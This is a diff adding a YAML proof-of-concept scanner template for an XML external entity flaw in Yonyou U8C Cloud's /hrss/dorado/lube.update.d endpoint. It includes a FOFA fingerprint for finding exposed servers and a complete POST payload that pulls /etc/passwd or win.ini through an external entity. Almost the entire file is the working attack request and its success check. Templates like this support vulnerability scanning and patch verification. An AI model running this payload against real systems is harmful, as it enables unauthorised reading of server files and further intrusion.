@@ -1,0 +1,31 @@
+id: poc-yaml-yongyou-u8c-cloud-update-xxe
+info:
+  name: 用友-U8C-Cloud-update-外部实体注入
+  severity: high
+  tags:
+  - xxe
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  r_data_linux: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+firstRequest:
+  method: GET
+  path: /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true
+  expression: 'status_code == 200
+
+    '
+requests:
+- method: POST
+  path: /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: __type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE
+    z [<!ENTITY test  SYSTEM "{{.r_data_linux}}" >]><rpc transaction="10" method="resetPwd"><def><dataset
+    type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r
+    id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
